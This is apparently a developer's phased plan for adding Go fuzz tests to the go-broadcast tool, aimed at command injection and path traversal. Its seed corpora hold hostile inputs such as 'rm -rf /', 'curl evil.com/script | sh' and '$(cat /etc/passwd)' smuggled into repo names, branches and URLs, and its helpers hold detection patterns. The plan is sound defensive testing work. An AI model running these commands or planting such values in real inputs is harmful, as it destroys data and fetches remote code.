# Fuzz Testing Implementation Plan for go-broadcast

## Executive Summary

This document outlines a comprehensive plan to implement fuzz testing for the go-broadcast project, focusing on discovering edge cases, security vulnerabilities, and ensuring robust input validation across all critical components.

## Objectives

1. **Security Hardening**: Identify and prevent command injection, path traversal, and other security vulnerabilities
2. **Input Validation**: Ensure all user inputs and configurations are properly validated
3. **Robustness**: Discover edge cases that could cause panics or unexpected behavior
4. **Continuous Testing**: Integrate fuzz testing into CI/CD pipeline for ongoing security validation

## Technical Approach

### Fuzzing Framework
- Use Go 1.18+ native fuzzing capabilities
- Leverage `testing.F` for fuzz test implementation
- Create comprehensive seed corpus for each fuzz target
- Implement custom mutators for domain-specific inputs

### Target Selection Criteria
1. All input parsing functions (YAML, JSON, command-line)
2. Security-critical operations (Git commands, file operations)
3. String manipulation and template processing
4. Network and API interactions
5. Path and URL handling

### NOTE: AFTER EVERY PHASE
- run: `make lint` to ensure code quality
- run: `make test` to ensure all tests pass

## Implementation Phases

### Phase 1: Infrastructure Setup (Days 1-2)

#### 1.1 Create Fuzz Testing Directory Structure
```
internal/
├── config/
│   └── fuzz_test.go
├── git/
│   └── fuzz_test.go
├── github/
│   └── cli/
│       └── fuzz_test.go
├── transform/
│   └── fuzz_test.go
└── fuzz/
    ├── corpus/
    │   ├── config/
    │   ├── git/
    │   ├── github/
    │   └── transform/
    ├── corpus_generator.go
    └── helpers.go
```

#### 1.2 Create Fuzz Testing Helpers
```go
// internal/fuzz/helpers.go
package fuzz

import (
    "strings"
    "unicode"
)

// ContainsShellMetachars checks for shell metacharacters
func ContainsShellMetachars(s string) bool {
    metachars := []string{";", "&", "|", "`", "$", "(", ")", "{", "}", "<", ">", "\\", "'", "\"", "\n", "\r"}
    for _, char := range metachars {
        if strings.Contains(s, char) {
            return true
        }
    }
    return false
}

// ContainsPathTraversal checks for path traversal attempts
func ContainsPathTraversal(path string) bool {
    dangerous := []string{"..", "../", "..\\", "/..", "\\..", "/etc/", "\\windows\\", "/dev/", "/proc/"}
    pathLower := strings.ToLower(path)
    for _, pattern := range dangerous {
        if strings.Contains(pathLower, pattern) {
            return true
        }
    }
    return false
}

// IsValidUTF8 validates UTF-8 encoding
func IsValidUTF8(s string) bool {
    for _, r := range s {
        if r == unicode.ReplacementChar {
            return false
        }
    }
    return true
}
```

#### 1.3 Create Corpus Generator
```go
// internal/fuzz/corpus_generator.go
package fuzz

import (
    "encoding/json"
    "fmt"
    "os"
    "path/filepath"
)

type CorpusGenerator struct {
    BaseDir string
}

func NewCorpusGenerator(baseDir string) *CorpusGenerator {
    return &CorpusGenerator{BaseDir: baseDir}
}

func (g *CorpusGenerator) GenerateConfigCorpus() error {
    corpus := []string{
        // Valid configs
        `version: 1
source:
  repo: org/repo
  branch: main`,
        
        // Edge cases
        `version: 999999`,
        `version: -1`,
        `version: "1.0"`,
        
        // Security attempts
        `source: {repo: "../../etc/passwd"}`,
        `source: {repo: "org/repo; rm -rf /"}`,
        `source: {repo: "org/repo && curl evil.com/script | sh"}`,
        
        // Unicode and special chars
        `source: {repo: "🎉/🎉"}`,
        `source: {repo: "org/repo\x00"}`,
        
        // Deeply nested
        generateDeeplyNested(100),
    }
    
    return g.saveCorpus("config", corpus)
}

func (g *CorpusGenerator) saveCorpus(category string, corpus []string) error {
    dir := filepath.Join(g.BaseDir, "corpus", category)
    if err := os.MkdirAll(dir, 0755); err != nil {
        return err
    }
    
    for i, data := range corpus {
        file := filepath.Join(dir, fmt.Sprintf("seed_%d", i))
        if err := os.WriteFile(file, []byte(data), 0644); err != nil {
            return err
        }
    }
    return nil
}
```

#### Phase 1 Status Tracking
At the end of Phase 1, update `plan-03-status.md` with:
- **Completed**: List all implemented components (helpers.go, corpus_generator.go, directory structure)
- **Successes**: What worked well, any insights gained
- **Challenges**: Any issues encountered, deviations from plan
- **Next Steps**: What needs to be carried forward to Phase 2

### Phase 2: Config Package Fuzzing (Days 3-4)

### NOTE: AFTER EVERY PHASE
- run: `make lint` to ensure code quality
- run: `make test` to ensure all tests pass

#### 2.1 YAML Parsing Fuzzer
```go
// internal/config/fuzz_test.go
//go:build go1.18

package config

import (
    "testing"
    "gopkg.in/yaml.v3"
    "github.com/yourusername/go-broadcast/internal/fuzz"
)

func FuzzConfigParsing(f *testing.F) {
    // Add seed corpus
    seeds := [][]byte{
        []byte(`version: 1
source:
  repo: org/repo
  branch: main
targets:
  - repo: target/repo
    files:
      - from: README.md
        to: README.md`),
        []byte(`version: 999999`),
        []byte(`source: {repo: "../../etc/passwd"}`),
        []byte(`{{{{{{{{{}`),
    }
    
    for _, seed := range seeds {
        f.Add(seed)
    }
    
    f.Fuzz(func(t *testing.T, data []byte) {
        var cfg Config
        err := yaml.Unmarshal(data, &cfg)
        
        if err != nil {
            // Parsing error is acceptable
            return
        }
        
        // If parsed, must validate safely
        defer func() {
            if r := recover(); r != nil {
                t.Fatalf("Panic during validation: %v with input: %s", r, string(data))
            }
        }()
        
        validationErr := cfg.Validate()
        if validationErr == nil {
            // Valid config should not contain security issues
            if cfg.Source.Repo != "" && fuzz.ContainsPathTraversal(cfg.Source.Repo) {
                t.Errorf("Path traversal in validated config: %s", cfg.Source.Repo)
            }
            
            // Check all file mappings
            for _, target := range cfg.Targets {
                for _, file := range target.Files {
                    if fuzz.ContainsPathTraversal(file.From) || fuzz.ContainsPathTraversal(file.To) {
                        t.Errorf("Path traversal in file mapping: %s -> %s", file.From, file.To)
                    }
                }
            }
        }
    })
}

func FuzzRepoNameValidation(f *testing.F) {
    seeds := []string{
        "org/repo",
        "org/repo.git",
        "../../../etc/passwd",
        "org/repo; rm -rf /",
        "org/repo && curl evil.com | sh",
        "🎉/🎉",
        "org/repo\x00",
        "ORG/REPO",
        "org-name/repo-name",
        "org.name/repo.name",
        "a/b/c",
        "",
        "org/",
        "/repo",
        "org//repo",
    }
    
    for _, seed := range seeds {
        f.Add(seed)
    }
    
    f.Fuzz(func(t *testing.T, repoName string) {
        defer func() {
            if r := recover(); r != nil {
                t.Fatalf("Panic in repo validation: %v with input: %s", r, repoName)
            }
        }()
        
        isValid := isValidRepoName(repoName)
        
        if isValid {
            // Additional security checks for valid names
            if fuzz.ContainsShellMetachars(repoName) {
                t.Errorf("Shell metacharacters in valid repo name: %s", repoName)
            }
            
            if fuzz.ContainsPathTraversal(repoName) {
                t.Errorf("Path traversal in valid repo name: %s", repoName)
            }
            
            // Should match GitHub format
            parts := strings.Split(repoName, "/")
            if len(parts) != 2 || parts[0] == "" || parts[1] == "" {
                t.Errorf("Invalid GitHub format marked as valid: %s", repoName)
            }
        }
    })
}

func FuzzBranchNameValidation(f *testing.F) {
    seeds := []string{
        "main",
        "feature/test",
        "feature/test; rm -rf /",
        "feat`whoami`",
        "feat$(cat /etc/passwd)",
        "refs/heads/main",
        "~branch",
        "branch^",
        "branch..other",
        "branch with spaces",
        "бранч", // Cyrillic
        "分支",   // Chinese
        "",
    }
    
    for _, seed := range seeds {
        f.Add(seed)
    }
    
    f.Fuzz(func(t *testing.T, branch string) {
        defer func() {
            if r := recover(); r != nil {
                t.Fatalf("Panic in branch validation: %v with input: %s", r, branch)
            }
        }()
        
        isValid := isValidBranchName(branch)
        
        if isValid {
            if fuzz.ContainsShellMetachars(branch) {
                t.Errorf("Shell metacharacters in valid branch name: %s", branch)
            }
        }
    })
}
```

#### Phase 2 Status Tracking
At the end of Phase 2, update `plan-03-status.md` with:
- **Completed**: List all config package fuzz tests implemented
- **Successes**: Any vulnerabilities found, validation improvements made
- **Challenges**: Complex YAML structures, edge cases discovered
- **Next Steps**: Insights to apply to Git package fuzzing

### Phase 3: Git Package Fuzzing (Days 5-6)

#### 3.1 Git Command Safety Fuzzer
```go
// internal/git/fuzz_test.go
//go:build go1.18

package git

import (
    "context"
    "testing"
    "github.com/yourusername/go-broadcast/internal/fuzz"
)

func FuzzGitURLSafety(f *testing.F) {
    seeds := []string{
        "https://github.com/org/repo.git",
        "git@github.com:org/repo.git",
        "https://github.com/org/repo.git; rm -rf /",
        "https://github.com/org/repo.git && curl evil.com | sh",
        "file:///etc/passwd",
        "https://user:pass@github.com/org/repo.git",
        "https://github.com/org/repo.git#$(whoami)",
        "../../../etc/passwd",
        "https://github.com/../../../../etc/passwd",
        "git://[::1]/repo.git",
    }
    
    for _, seed := range seeds {
        f.Add(seed)
    }
    
    f.Fuzz(func(t *testing.T, url string) {
        defer func() {
            if r := recover(); r != nil {
                t.Fatalf("Panic with URL: %v, input: %s", r, url)
            }
        }()
        
        client := &gitClient{
            runner: &mockCommandRunner{
                validateCommand: func(name string, args []string) error {
                    // Ensure URL is properly escaped
                    for _, arg := range args {
                        if arg == url && fuzz.ContainsShellMetachars(url) {
                            t.Errorf("Unescaped shell metacharacters in git command: %s", url)
                        }
                    }
                    return nil
                },
            },
        }
        
        _ = client.Clone(context.Background(), url, "/tmp/test", "main", nil)
    })
}

func FuzzGitFilePath(f *testing.F) {
    seeds := []string{
        "README.md",
        "../../../etc/passwd",
        "file with spaces.txt",
        "file;rm -rf /.txt",
        "file\x00.txt",
        ".git/config",
        "путь/к/файлу.txt", // Cyrillic path
        "文件/路径.txt",      // Chinese path
        "file|command.txt",
        "file>.txt",
        "file<.txt",
    }
    
    for _, seed := range seeds {
        f.Add(seed)
    }
    
    f.Fuzz(func(t *testing.T, filePath string) {
        defer func() {
            if r := recover(); r != nil {
                t.Fatalf("Panic with file path: %v, input: %s", r, filePath)
            }
        }()
        
        client := &gitClient{
            runner: &mockCommandRunner{
                validateCommand: func(name string, args []string) error {
                    // Check for command injection in file paths
                    for _, arg := range args {
                        if arg == filePath {
                            if fuzz.ContainsPathTraversal(filePath) {
                                t.Errorf("Path traversal in git command: %s", filePath)
                            }
                            if fuzz.ContainsShellMetachars(filePath) {
                                // File paths with special chars should be quoted
                                t.Logf("Special characters in file path should be handled: %s", filePath)
                            }
                        }
                    }
                    return nil
                },
            },
        }
        
        _ = client.Add(context.Background(), "/tmp/test", filePath)
    })
}
```

#### Phase 3 Status Tracking
At the end of Phase 3, update `plan-03-status.md` with:
- **Completed**: Git URL and file path fuzz tests implemented
- **Successes**: Command injection prevention verified, path handling secured
- **Challenges**: Handling special characters in Git commands
- **Next Steps**: Apply security patterns to GitHub CLI fuzzing

### Phase 4: GitHub CLI Package Fuzzing (Days 7-8)

### NOTE: AFTER EVERY PHASE
- run: `make lint` to ensure code quality
- run: `make test` to ensure all tests pass

#### 4.1 GitHub CLI Command Fuzzer
```go
// internal/github/cli/fuzz_test.go
//go:build go1.18

package cli

import (
    "testing"
    "github.com/yourusername/go-broadcast/internal/fuzz"
)

func FuzzGitHubCLIArgs(f *testing.F) {
    seeds := []struct {
        args []string
    }{
        {[]string{"pr", "create", "--title", "Test PR"}},
        {[]string{"pr", "create", "--title", "Test; rm -rf /"}},
        {[]string{"pr", "create", "--title", "Test`whoami`"}},
        {[]string{"pr", "create", "--body", "$(cat /etc/passwd)"}},
        {[]string{"repo", "clone", "../../etc/passwd"}},
        {[]string{"api", "/repos/org/repo", "-f", "name=test;echo injected"}},
    }
    
    for _, seed := range seeds {
        f.Add(seed.args)
    }
    
    f.Fuzz(func(t *testing.T, args []string) {
        defer func() {
            if r := recover(); r != nil {
                t.Fatalf("Panic with args: %v, input: %v", r, args)
            }
        }()
        
        client := &Client{
            runner: &mockRunner{
                validateArgs: func(providedArgs []string) error {
                    for _, arg := range providedArgs {
                        if fuzz.ContainsShellMetachars(arg) {
                            // Should be properly quoted or escaped
                            t.Logf("Potential injection in arg: %s", arg)
                        }
                    }
                    return nil
                },
            },
        }
        
        _, _ = client.run(args...)
    })
}

func FuzzJSONParsing(f *testing.F) {
    seeds := []string{
        `{"name": "repo", "owner": {"login": "org"}}`,
        `{"name": "repo"}`,
        `{{{{{`,
        `{"name": "repo\"; rm -rf /"}`,
        `{"name": "` + string([]byte{0x00}) + `"}`,
        `{"name": "very` + strings.Repeat("long", 10000) + `name"}`,
        `[{"name": "repo1"}, {"name": "repo2"}]`,
    }
    
    for _, seed := range seeds {
        f.Add(seed)
    }
    
    f.Fuzz(func(t *testing.T, jsonData string) {
        defer func() {
            if r := recover(); r != nil {
                t.Fatalf("Panic parsing JSON: %v, input: %s", r, jsonData)
            }
        }()
        
        var result interface{}
        err := parseJSON([]byte(jsonData), &result)
        
        if err == nil {
            // Successfully parsed - check for security issues
            if str, ok := result.(string); ok {
                if fuzz.ContainsShellMetachars(str) {
                    t.Logf("Shell metacharacters in parsed JSON: %s", str)
                }
            }
        }
    })
}
```

#### Phase 4 Status Tracking
At the end of Phase 4, update `plan-03-status.md` with:
- **Completed**: GitHub CLI argument and JSON parsing fuzz tests
- **Successes**: API injection prevention, JSON parsing robustness
- **Challenges**: Complex GitHub API interactions, authentication handling
- **Next Steps**: Final phase - template and transform fuzzing

### Phase 5: Transform Package Fuzzing (Days 9-10)

### NOTE: AFTER EVERY PHASE
- run: `make lint` to ensure code quality
- run: `make test` to ensure all tests pass

#### 5.1 Template Variable Fuzzer
```go
// internal/transform/fuzz_test.go
//go:build go1.18

package transform

import (
    "testing"
    "strings"
    "github.com/yourusername/go-broadcast/internal/fuzz"
)

func FuzzTemplateVariableReplacement(f *testing.F) {
    seeds := []struct {
        template string
        vars     map[string]string
    }{
        {
            template: "Hello {{NAME}}!",
            vars:     map[string]string{"NAME": "World"},
        },
        {
            template: "Path: {{PATH}}",
            vars:     map[string]string{"PATH": "../../../etc/passwd"},
        },
        {
            template: "Cmd: {{CMD}}",
            vars:     map[string]string{"CMD": "; rm -rf /"},
        },
        {
            template: "{{VAR1}}{{VAR2}}{{VAR1}}",
            vars:     map[string]string{"VAR1": "{{VAR2}}", "VAR2": "{{VAR1}}"},
        },
        {
            template: "Unicode: {{UNICODE}}",
            vars:     map[string]string{"UNICODE": "🎉🎊🎈"},
        },
    }
    
    for _, seed := range seeds {
        templateBytes := []byte(seed.template)
        varsBytes, _ := json.Marshal(seed.vars)
        f.Add(templateBytes, varsBytes)
    }
    
    f.Fuzz(func(t *testing.T, templateData []byte, varsData []byte) {
        defer func() {
            if r := recover(); r != nil {
                t.Fatalf("Panic in template replacement: %v", r)
            }
        }()
        
        var vars map[string]string
        if err := json.Unmarshal(varsData, &vars); err != nil {
            // Invalid vars JSON is acceptable
            return
        }
        
        template := string(templateData)
        result := replaceVariables(template, vars)
        
        // Check for infinite recursion protection
        if len(result) > len(template)*100 {
            t.Errorf("Possible infinite expansion: template %d bytes -> result %d bytes", 
                len(template), len(result))
        }
        
        // Check for security issues in result
        for key, value := range vars {
            if fuzz.ContainsPathTraversal(value) && strings.Contains(result, value) {
                t.Logf("Path traversal in template result via %s: %s", key, value)
            }
        }
    })
}

func FuzzRegexReplacement(f *testing.F) {
    seeds := []struct {
        pattern     string
        replacement string
        input       string
    }{
        {`\d+`, "NUM", "Replace 123 with NUM"},
        {`(.*)`, "$1$1", "double"},
        {`(a+)(b+)`, "$2$1", "aaabbb"},
        {`[`, "X", "test[bracket"},  // Invalid regex
        {`.+`, "../etc/passwd", "replace with path"},
    }
    
    for _, seed := range seeds {
        f.Add(seed.pattern, seed.replacement, seed.input)
    }
    
    f.Fuzz(func(t *testing.T, pattern, replacement, input string) {
        defer func() {
            if r := recover(); r != nil {
                t.Fatalf("Panic in regex replacement: %v", r)
            }
        }()
        
        result, err := applyRegexTransform(pattern, replacement, input)
        
        if err == nil && result != "" {
            // Check for exponential growth
            if len(result) > len(input)*10 {
                t.Logf("Large expansion in regex: %d -> %d bytes", len(input), len(result))
            }
            
            // Check for security issues
            if fuzz.ContainsPathTraversal(result) && !fuzz.ContainsPathTraversal(input) {
                t.Errorf("Path traversal introduced by regex replacement")
            }
        }
    })
}
```

#### 5.2 Investigate all fuzz tests
- Look at results from all fuzz tests
- Get them all working, fix issues, log as needed
- The point of fuzzing is to find edge cases and security issues, so ensure all tests are robust and that we fix any issues found

#### 5.3 Make sure test data is omitted from the final build
- Add ANY fuzz data, directories or files to `.gitignore`

#### Phase 5 Status Tracking
At the end of Phase 5, update `plan-03-status.md` with:
- **Completed**: Template variable and regex replacement fuzz tests
- **Successes**: Infinite recursion prevention, security validation
- **Challenges**: Complex template scenarios, regex edge cases
- **Integration**: Run `make test-fuzz` to verify all fuzz tests work together

## Testing Infrastructure

The project already has `make test-fuzz` configured to automatically discover and run all fuzz tests. After implementing each phase:
1. Run `make test-fuzz` to verify the new fuzz tests work correctly
2. The CI pipeline will automatically run fuzz tests on pull requests
3. Extended fuzzing can be configured through environment variables if needed

## Implementation Timeline

### Week 1 (Days 1-5)
- **Day 1-2**: Set up fuzz testing infrastructure
  - Create directory structure
  - Implement helper functions
  - Set up corpus generator
  
- **Day 3-4**: Implement config package fuzzing
  - YAML parsing fuzzer
  - Repository name validation
  - Branch name validation
  
- **Day 5**: Implement basic Git package fuzzing
  - URL safety fuzzer
  - Initial command injection tests

### Week 2 (Days 6-10)
- **Day 6**: Complete Git package fuzzing
  - File path fuzzing
  - Advanced command safety tests
  
- **Day 7-8**: Implement GitHub CLI fuzzing
  - Argument injection tests
  - JSON parsing safety
  
- **Day 9-10**: Implement transform package fuzzing
  - Template variable replacement
  - Regex transformation safety

## Success Criteria

### Coverage Metrics
- **100%** of input parsing functions have fuzz tests
- **100%** of security-critical paths covered
- **90%+** code coverage in fuzzed packages
- **0** panics in 24-hour continuous fuzzing

### Security Metrics
- **0** command injection vulnerabilities
- **0** path traversal vulnerabilities
- **0** unhandled panics
- **100%** of findings documented and fixed

### Performance Metrics
- Fuzz tests complete in <2 minutes for CI
- Extended fuzzing finds issues within 10 minutes
- Corpus generation takes <30 seconds
- Memory usage stays under 1GB during fuzzing

## Maintenance and Evolution

### Ongoing Tasks
1. **Weekly corpus updates**: Add new test cases based on real-world inputs
2. **Monthly security reviews**: Analyze fuzz testing results and trends
3. **Quarterly expansion**: Add fuzzing to new features and packages
4. **Annual audit**: Full security audit including fuzz testing results

### Corpus Management
```bash
# Minimize corpus (remove redundant test cases)
go test -fuzz=FuzzConfigParsing -fuzzminimizetime=10m

# Export interesting test cases
cp .fuzz/FuzzConfigParsing/interesting/* corpus/config/

# Share corpus across team
git add corpus/
git commit -m "Update fuzz corpus with new edge cases"
```

### Integration with Security Tools
1. **SAST Integration**: Feed fuzz findings to static analysis
2. **Dependency Scanning**: Fuzz third-party library usage
3. **Security Dashboards**: Track fuzz testing metrics
4. **Alert Integration**: Notify on high-severity findings

## Conclusion

This comprehensive fuzz testing implementation plan will significantly enhance the security and robustness of go-broadcast. By systematically fuzzing all input paths and security-critical operations, we can proactively discover and fix vulnerabilities before they reach production. The integration with CI/CD ensures continuous security validation as the codebase evolves.
